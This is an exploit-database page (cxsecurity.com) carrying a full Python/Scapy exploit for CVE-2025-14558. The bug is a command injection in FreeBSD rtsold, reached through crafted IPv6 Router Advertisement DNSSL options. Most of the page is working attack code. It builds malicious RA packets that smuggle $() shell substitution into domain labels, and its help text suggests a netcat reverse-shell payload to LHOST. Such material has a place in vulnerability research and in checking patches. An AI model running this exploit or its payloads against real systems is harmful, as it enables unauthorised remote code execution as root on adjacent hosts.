---
title: FreeBSD rtsold 15.x Remote Code Execution via DNSSL
url: https://cxsecurity.com/issue/WLB-2026020026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-23
fetch_date: 2026-02-24T04:11:32.417725
---

# FreeBSD rtsold 15.x Remote Code Execution via DNSSL

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FreeBSD rtsold 15.x Remote Code Execution via DNSSL** **2026.02.23**  Credit:  **[Lukas Johannes Möller](https://cxsecurity.com/author/Lukas%2BJohannes%2BM%C3%B6ller/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-14558](https://cxsecurity.com/cveshow/CVE-2025-14558/ "Click to see CVE-2025-14558")**  CWE: **N/A** | |

# Exploit Title: FreeBSD rtsold 15.x - Remote Code Execution via DNSSL
# Date: 2025-12-16
# Exploit Author: Lukas Johannes Möller
# Vendor Homepage: https://www.freebsd.org/
# Version: FreeBSD 13.x, 14.x, 15.x (before 2025-12-16 patches)
# Tested on: FreeBSD 14.1-RELEASE
# CVE: CVE-2025-14558
#
# Description:
# rtsold(8) processes IPv6 Router Advertisement DNSSL options without
# validating domain names for shell metacharacters. The decoded domains
# are passed to resolvconf(8), a shell script that uses unquoted variable
# expansion, enabling command injection via $() substitution.
#
# Requirements:
# - Layer 2 adjacency to target
# - Target running rtsold with ACCEPT\_RTADV enabled
# - Root privileges (raw socket for sending RA)
# - Python 3 + Scapy
#
# References:
# https://security.FreeBSD.org/advisories/FreeBSD-SA-25:12.rtsold.asc
# https://github.com/JohannesLks/CVE-2025-14558
import argparse
import struct
import sys
import time
try:
from scapy.all import (
Ether, IPv6, ICMPv6ND\_RA, ICMPv6NDOptPrefixInfo,
ICMPv6NDOptSrcLLAddr, Raw, get\_if\_hwaddr, sendp
)
except ImportError:
sys.exit("[!] Scapy required: pip install scapy")
def encode\_domain(name):
"""Encode domain in DNS wire format (RFC 1035)."""
result = b""
for label in name.split("."):
if label:
data = label.encode()
result += bytes([len(data)]) + data
return result + b"\x00"
def encode\_payload(cmd):
"""Encode payload as DNS label with $() wrapper for command substitution."""
payload = f"$({cmd})".encode()
if len(payload) > 63:
# Split long payloads across labels (dots inserted on decode)
result = b""
while payload:
chunk = payload[:63]
payload = payload[63:]
result += bytes([len(chunk)]) + chunk
return result + b"\x00"
return bytes([len(payload)]) + payload + b"\x00"
def build\_dnssl(cmd, lifetime=0xFFFFFFFF):
"""Build DNSSL option (RFC 6106) with injected command."""
data = encode\_domain("x.local") + encode\_payload(cmd)
# Pad to 8-byte boundary
pad = (8 - (len(data) + 8) % 8) % 8
data += b"\x00" \* pad
# Type=31 (DNSSL), Length in 8-octet units
length = (8 + len(data)) // 8
return struct.pack(">BBH", 31, length, 0) + struct.pack(">I", lifetime) + data
def build\_ra(mac, payload):
"""Build Router Advertisement with malicious DNSSL."""
return (
Ether(src=mac, dst="33:33:00:00:00:01")
/ IPv6(src="fe80::1", dst="ff02::1", hlim=255)
/ ICMPv6ND\_RA(chlim=64, M=0, O=1, routerlifetime=1800)
/ ICMPv6NDOptSrcLLAddr(lladdr=mac)
/ ICMPv6NDOptPrefixInfo(
prefixlen=64, L=1, A=1,
validlifetime=2592000, preferredlifetime=604800,
prefix="2001:db8::"
)
/ Raw(load=build\_dnssl(payload))
)
def main():
p = argparse.ArgumentParser(
description="CVE-2025-14558 - FreeBSD rtsold DNSSL Command Injection",
epilog="Examples:\n"
" %(prog)s -i eth0\n"
" %(prog)s -i eth0 -p 'id>/tmp/pwned'\n"
" %(prog)s -i eth0 -p 'nc LHOST 4444 -e /bin/sh'",
formatter\_class=argparse.RawDescriptionHelpFormatter
)
p.add\_argument("-i", "--interface", required=True, help="Network interface")
p.add\_argument("-p", "--payload", default="touch /tmp/pwned", help="Command to execute")
p.add\_argument("-c", "--count", type=int, default=3, help="Packets to send (default: 3)")
args = p.parse\_args()
try:
mac = get\_if\_hwaddr(args.interface)
except Exception as e:
sys.exit(f"[!] Interface error: {e}")
print(f"[\*] Interface: {args.interface} ({mac})")
print(f"[\*] Payload: {args.payload}")
pkt = build\_ra(mac, args.payload)
for i in range(args.count):
sendp(pkt, iface=args.interface, verbose=False)
print(f"[+] Sent RA {i+1}/{args.count}")
if i < args.count - 1:
time.sleep(1)
print("[+] Done")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top